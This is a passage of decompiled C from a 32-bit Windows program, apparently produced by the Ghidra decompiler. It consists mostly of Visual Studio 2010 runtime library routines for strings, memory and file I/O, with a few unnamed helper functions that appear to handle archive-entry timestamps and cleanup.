            lVar17 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            *(longlong *)(piVar14 + 0x88) = lVar17;
          }
          if (local_321 != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar4 + 3 + (int)pvVar5),
                                      *(undefined *)(iVar4 + 2 + (int)pvVar5)),
                             *(undefined *)(iVar4 + 1 + (int)pvVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar4 + (int)pvVar5));
            iVar4 = iVar4 + 4;
            lVar17 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            *(longlong *)(piVar14 + 0x84) = lVar17;
          }
          if (local_322 != 0) {
            iVar2 = CONCAT21(CONCAT11(*(undefined *)(iVar4 + 3 + (int)pvVar5),
                                      *(undefined *)(iVar4 + 2 + (int)pvVar5)),
                             *(undefined *)(iVar4 + 1 + (int)pvVar5));
            uVar9 = CONCAT31(iVar2,*(undefined *)(iVar4 + (int)pvVar5));
            lVar17 = __allmul(uVar9 + 0xb6109100,
                              ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar9),10000000,0);
            *(longlong *)(piVar14 + 0x86) = lVar17;
          }
          break;
        }
        iVar11 = iVar11 + 4 + (uint)*(byte *)(iVar11 + 2 + (int)pvVar5);
      } while ((char *)(iVar11 + 4U) < local_32c);
    }
    if (pvVar5 != (void *)0x0) {
      FUN_0040a83e(pvVar5);
    }
    piVar15 = local_330 + 2;
    for (iVar11 = 0x8c; iVar11 != 0; iVar11 = iVar11 + -1) {
      *piVar15 = *piVar14;
      piVar14 = piVar14 + 1;
      piVar15 = piVar15 + 1;
    }
    local_330[0x8e] = param_3;
    ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
    return;
  }
  FUN_0040a83e(pvVar5);
LAB_00409f75:
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040a3b0(void *param_1,void *param_2)

{
  int iVar1;
  int iVar2;
  byte *pbVar3;
  int *unaff_EBX;
  char local_9;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00409b40();
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_00409480();
    }
    iVar1 = *(int *)(*unaff_EBX + 0x10);
    while (iVar1 < 0) {
      iVar1 = *unaff_EBX;
      if (((iVar1 != 0) && (*(int *)(iVar1 + 0x18) != 0)) &&
         (iVar2 = *(int *)(iVar1 + 0x10) + 1, iVar2 != *(int *)(iVar1 + 4))) {
        *(int *)(iVar1 + 0x10) = iVar2;
        *(int *)(iVar1 + 0x14) =
             *(int *)(iVar1 + 0x14) +
             *(int *)(iVar1 + 0x50) + *(int *)(iVar1 + 0x4c) + 0x2e + *(int *)(iVar1 + 0x48);
        iVar2 = FUN_00409080((int *)(iVar1 + 0x28),(uint *)(iVar1 + 0x78),(void *)0x0,0);
        *(uint *)(iVar1 + 0x18) = (uint)(iVar2 == 0);
      }
      iVar1 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_00409770((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  pbVar3 = FUN_004098e0(param_2,param_1,&local_9);
  if ((int)pbVar3 < 1) {
    FUN_00409b40();
    unaff_EBX[1] = -1;
  }
  if (local_9 == '\0') {
    if ((int)pbVar3 < 1) {
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040a500(void)

{
  void **_Memory;
  void *pvVar1;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_00409b40();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_00409b40();
    }
    pvVar1 = *_Memory;
    if (pvVar1 != (void *)0x0) {
      if (*(char *)((int)pvVar1 + 0x10) != '\0') {
        CloseHandle(*(HANDLE *)((int)pvVar1 + 4));
      }
      FUN_0040a83e(pvVar1);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_0040a560(undefined4 param_1,undefined4 param_2)

{
  void *pvVar1;
  undefined4 *puVar2;
  int **unaff_FS_OFFSET;
  int *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00419e0b;
  local_10 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_10;
  pvVar1 = operator_new(0x44c);
  local_8 = 0;
  if (pvVar1 == (void *)0x0) {
    pvVar1 = (void *)0x0;
  }
  else {
    pvVar1 = (void *)FUN_00409c60();
  }
  local_8 = 0xffffffff;
  _DAT_00423820 = FUN_00409cb0(param_1,param_2);
  if (_DAT_00423820 != 0) {
    if (pvVar1 != (void *)0x0) {
      if (*(void **)((int)pvVar1 + 0x23c) != (void *)0x0) {
        FUN_0040a83e(*(void **)((int)pvVar1 + 0x23c));
      }
      *(undefined4 *)((int)pvVar1 + 0x23c) = 0;
      if (*(void **)((int)pvVar1 + 0x240) != (void *)0x0) {
        FUN_0040a83e(*(void **)((int)pvVar1 + 0x240));
      }
      *(undefined4 *)((int)pvVar1 + 0x240) = 0;
      FUN_0040a83e(pvVar1);
    }
    *unaff_FS_OFFSET = local_10;
    return (undefined4 *)0x0;
  }
  puVar2 = (undefined4 *)operator_new(8);
  *puVar2 = 1;
  puVar2[1] = pvVar1;
  *unaff_FS_OFFSET = local_10;
  return puVar2;
}



void FUN_0040a650(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x23c) != (void *)0x0) {
    FUN_0040a83e(*(void **)((int)unaff_ESI + 0x23c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x23c) = 0;
  if (*(void **)((int)unaff_ESI + 0x240) != (void *)0x0) {
    FUN_0040a83e(*(void **)((int)unaff_ESI + 0x240));
  }
  *(undefined4 *)((int)unaff_ESI + 0x240) = 0;
  FUN_0040a83e(unaff_ESI);
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00420044) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)pwVar3 - (int)_Src;
        do {
          wVar1 = *_Src;
          *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eStack_10 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040a6c4;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040a6c4:
  FUN_0040c664();
  return eStack_10;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    if (_Src != (wchar_t *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        wVar1 = *_Src;
        *(wchar_t *)(iVar3 + (int)_Src) = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040a767;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040a767:
  FUN_0040c664();
  return eStack_10;
}



void __cdecl FUN_0040a7ab(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



uint FUN_0040a7bd(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x0040a805:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x0040a805;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



void FUN_0040a83e(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _malloc(size_t _Size)

{
  SIZE_T dwBytes;
  LPVOID pvVar1;
  int iVar2;
  int *piVar3;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_00422218 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(DAT_00422218,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_00422220 == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2010 Release

void __cdecl _free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_00422218,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0041e870;
  uStack_c = 0x40a923;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_0040a9cb();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00420044,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_0040a9cb(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2010 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_0040ab18();
  }
  return iVar2;
}



void FUN_0040ab18(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  char *pcVar5;
  FILE *pFVar6;
  long lVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_8;
  
  pFVar6 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_0040c664();
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_8 = __lseek(_FileHandle,0,1);
  if (local_8 < 0) {
LAB_0040ac74:
    lVar7 = -1;
  }
  else {
    uVar1 = _File->_flag;
    if ((uVar1 & 0x108) == 0) {
      return local_8 - _File->_cnt;
    }
    pcVar5 = _File->_ptr;
    pcVar8 = _File->_base;
    local_10 = (int)pcVar5 - (int)pcVar8;
    if ((uVar1 & 3) == 0) {
      if (-1 < (char)uVar1) {
        piVar3 = __errno();
        *piVar3 = 0x16;
        goto LAB_0040ac74;
      }
    }
    else {
      pcVar2 = pcVar8;
      if ((*(byte *)((&DAT_00423840)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) &
          0x80) != 0) {
        for (; pcVar2 < pcVar5; pcVar2 = pcVar2 + 1) {
          if (*pcVar2 == '\n') {
            local_10 = local_10 + 1;
          }
        }
      }
    }
    if (local_8 == 0) {
      return local_10;
    }
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar5 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_00423840)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar7 = __lseek(_FileHandle,0,2);
          if (lVar7 == local_8) {
            pcVar5 = _File->_base;
            pcVar8 = pcVar5 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar5 < pcVar8; pcVar5 = pcVar5 + 1) {
              if (*pcVar5 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar6->_flag & 0x2000U) == 0;
          }
          else {
            lVar7 = __lseek(_FileHandle,local_8,0);
            if (lVar7 < 0) goto LAB_0040ac74;
            pFVar6 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar6 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_00423840)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar6;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_8 = local_8 - (int)_File;
      }
    }
    lVar7 = local_10 + local_8;
  }
  return lVar7;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2010 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_0040ad11();
  }
  return lVar2;
}



void FUN_0040ad11(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2010 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_0040ad8e:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) != 0) break;
LAB_0040ae04:
            if (uVar7 < local_10) {
              iVar5 = __filbuf(_File);
              if (iVar5 == -1) goto LAB_0040aec3;
              if (uVar1 == 0) goto LAB_0040ae99;
              *puVar2 = (char)iVar5;
              local_10 = _File->_bufsiz;
              uVar7 = uVar7 - 1;
              uVar1 = uVar1 - 1;
              puVar2 = puVar2 + 1;
            }
            else {
              if (local_10 == 0) {
                uVar4 = 0x7fffffff;
                if (uVar7 < 0x80000000) {
                  uVar4 = uVar7;
                }
              }
              else {
                if (uVar7 < 0x80000000) {
                  uVar6 = uVar7 % local_10;
                  uVar4 = uVar7;
                }
                else {
                  uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                  uVar4 = 0x7fffffff;
                }
                uVar4 = uVar4 - uVar6;
              }
              if (uVar1 < uVar4) goto LAB_0040ae99;
              _DstBuf_00 = puVar2;
              iVar5 = __fileno(_File);
              iVar5 = __read(iVar5,_DstBuf_00,uVar4);
              if (iVar5 == 0) {
                _File->_flag = _File->_flag | 0x10;
                goto LAB_0040aec3;
              }
              if (iVar5 == -1) goto LAB_0040aebf;
              uVar7 = uVar7 - iVar5;
              uVar1 = uVar1 - iVar5;
              puVar2 = puVar2 + iVar5;
            }
          }
          uVar4 = _File->_cnt;
          if (uVar4 == 0) goto LAB_0040ae04;
          if ((int)uVar4 < 0) {
LAB_0040aebf:
            _File->_flag = _File->_flag | 0x20;
LAB_0040aec3:
            return (uVar8 - uVar7) / _ElementSize;
          }
          uVar6 = uVar7;
          if (uVar4 <= uVar7) {
            uVar6 = uVar4;
          }
          if (uVar1 < uVar6) {
LAB_0040ae99:
            if (_DstSize != 0xffffffff) {
              _memset(_DstBuf,0,_DstSize);
            }
            piVar3 = __errno();
            *piVar3 = 0x22;
            goto LAB_0040ad4e;
          }
          _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
          _File->_cnt = _File->_cnt - uVar6;
          _File->_ptr = _File->_ptr + uVar6;
          uVar7 = uVar7 - uVar6;
          uVar1 = uVar1 - uVar6;
          puVar2 = puVar2 + uVar6;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_0040ad8e;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_0040ad4e:
    FUN_0040c664();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_0040af5b();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  return 0;
}



void FUN_0040af5b(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2010 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_0040b05b();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_0040b05b(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_0040b1a5;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          FID_conflict__memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_0040b161:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_0040b1a5;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_0040b161;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_0040b1a5:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_0040b1a5;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_0040b22a();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  return 0;
}



void FUN_0040b22a(void)

{
